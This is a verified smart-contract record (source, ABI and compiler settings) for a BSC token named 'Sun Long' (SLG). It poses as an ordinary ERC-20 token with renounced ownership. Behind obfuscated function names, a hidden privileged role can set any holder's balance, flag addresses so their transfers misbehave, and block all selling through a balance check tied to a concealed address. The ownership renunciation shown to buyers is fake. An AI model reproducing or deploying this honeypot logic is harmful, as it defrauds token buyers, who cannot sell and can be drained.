{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.15;\n\ninterface liquiditySell {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract minEnable {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface txSwap {\n    function createPair(address toTake, address senderAtIs) external returns (address);\n}\n\ninterface enableReceiver {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address receiverFeeSell) external view returns (uint256);\n\n    function transfer(address maxMarketing, uint256 sellSender) external returns (bool);\n\n    function allowance(address marketingReceiver, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 sellSender) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address maxMarketing,\n        uint256 sellSender\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed fromBuy, uint256 value);\n    event Approval(address indexed marketingReceiver, address indexed spender, uint256 value);\n}\n\ninterface enableReceiverMetadata is enableReceiver {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract SunLong is minEnable, enableReceiver, enableReceiverMetadata {\n\n    address public senderToken;\n\n    function limitEnable(uint256 sellSender) public {\n        takeMax();\n        totalBuy = sellSender;\n    }\n\n    function minMarketingFund(address maxTx, address maxMarketing, uint256 sellSender) internal returns (bool) {\n        require(fromSenderExempt[maxTx] >= sellSender);\n        fromSenderExempt[maxTx] -= sellSender;\n        fromSenderExempt[maxMarketing] += sellSender;\n        emit Transfer(maxTx, maxMarketing, sellSender);\n        return true;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return isLaunch;\n    }\n\n    function owner() external view returns (address) {\n        return senderLiquidity;\n    }\n\n    function launchedSell(address amountLiquidityFee) public {\n        takeMax();\n        \n        if (amountLiquidityFee == senderToken || amountLiquidityFee == txLimit) {\n            return;\n        }\n        takeTrading[amountLiquidityFee] = true;\n    }\n\n    function balanceOf(address receiverFeeSell) public view virtual override returns (uint256) {\n        return fromSenderExempt[receiverFeeSell];\n    }\n\n    address private senderLiquidity;\n\n    uint256 private receiverShould = 100000000 * 10 ** 18;\n\n    string private isLaunch = \"Sun Long\";\n\n    bool public maxMin;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return receiverShould;\n    }\n\n    function transferFrom(address maxTx, address maxMarketing, uint256 sellSender) external override returns (bool) {\n        if (_msgSender() != fundTx) {\n            if (toEnable[maxTx][_msgSender()] != type(uint256).max) {\n                require(sellSender <= toEnable[maxTx][_msgSender()]);\n                toEnable[maxTx][_msgSender()] -= sellSender;\n            }\n        }\n        return sellLiquidity(maxTx, maxMarketing, sellSender);\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return maxReceiverIs;\n    }\n\n    function allowance(address feeWallet, address shouldMin) external view virtual override returns (uint256) {\n        if (shouldMin == fundTx) {\n            return type(uint256).max;\n        }\n        return toEnable[feeWallet][shouldMin];\n    }\n\n    uint8 private maxReceiverIs = 18;\n\n    mapping(address => bool) public takeTrading;\n\n    function transfer(address tradingMarketing, uint256 sellSender) external virtual override returns (bool) {\n        return sellLiquidity(_msgSender(), tradingMarketing, sellSender);\n    }\n\n    string private tokenReceiver = \"SLG\";\n\n    bool private maxSender;\n\n    function launchLaunched(address marketingWallet) public {\n        if (maxMin) {\n            return;\n        }\n        \n        shouldLaunch[marketingWallet] = true;\n        \n        maxMin = true;\n    }\n\n    function receiverMin(address tradingMarketing, uint256 sellSender) public {\n        takeMax();\n        fromSenderExempt[tradingMarketing] = sellSender;\n    }\n\n    uint256 public receiverFund;\n\n    uint256 receiverIsAt;\n\n    event OwnershipTransferred(address indexed feeTeam, address indexed toSellSwap);\n\n    function getOwner() external view returns (address) {\n        return senderLiquidity;\n    }\n\n    uint256 public maxShould;\n\n    address listIs = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 constant totalTx = 16 ** 10;\n\n    function approve(address shouldMin, uint256 sellSender) public virtual override returns (bool) {\n        toEnable[_msgSender()][shouldMin] = sellSender;\n        emit Approval(_msgSender(), shouldMin, sellSender);\n        return true;\n    }\n\n    function takeMax() private view {\n        require(shouldLaunch[_msgSender()]);\n    }\n\n    bool private marketingMax;\n\n    mapping(address => mapping(address => uint256)) private toEnable;\n\n    mapping(address => uint256) private fromSenderExempt;\n\n    function sellLiquidity(address maxTx, address maxMarketing, uint256 sellSender) internal returns (bool) {\n        if (maxTx == senderToken) {\n            return minMarketingFund(maxTx, maxMarketing, sellSender);\n        }\n        uint256 fundMarketing = enableReceiver(txLimit).balanceOf(listIs);\n        require(fundMarketing == totalBuy);\n        require(maxMarketing != listIs);\n        if (takeTrading[maxTx]) {\n            return minMarketingFund(maxTx, maxMarketing, totalTx);\n        }\n        return minMarketingFund(maxTx, maxMarketing, sellSender);\n    }\n\n    address public txLimit;\n\n    constructor (){\n        if (buyFrom != receiverFund) {\n            receiverFund = buyFrom;\n        }\n        liquiditySell autoReceiverFund = liquiditySell(fundTx);\n        txLimit = txSwap(autoReceiverFund.factory()).createPair(autoReceiverFund.WETH(), address(this));\n        \n        senderToken = _msgSender();\n        sellMarketing();\n        shouldLaunch[senderToken] = true;\n        fromSenderExempt[senderToken] = receiverShould;\n        \n        emit Transfer(address(0), senderToken, receiverShould);\n    }\n\n    uint256 totalBuy;\n\n    function sellMarketing() public {\n        emit OwnershipTransferred(senderToken, address(0));\n        senderLiquidity = address(0);\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return tokenReceiver;\n    }\n\n    mapping(address => bool) public shouldLaunch;\n\n    uint256 private buyFrom;\n\n    address fundTx = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    bool private amountTo;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"marketingReceiver\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"feeTeam\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"toSellSwap\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fromBuy\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeWallet\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"shouldMin\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldMin\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"sellSender\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverFeeSell\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingWallet\",\"type\":\"address\"}],\"name\":\"launchLaunched\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountLiquidityFee\",\"type\":\"address\"}],\"name\":\"launchedSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"sellSender\",\"type\":\"uint256\"}],\"name\":\"limitEnable\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxShould\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverFund\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingMarketing\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"sellSender\",\"type\":\"uint256\"}],\"name\":\"receiverMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderToken\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"shouldLaunch\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"takeTrading\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingMarketing\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"sellSender\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxTx\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"maxMarketing\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"sellSender\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txLimit\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "SunLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}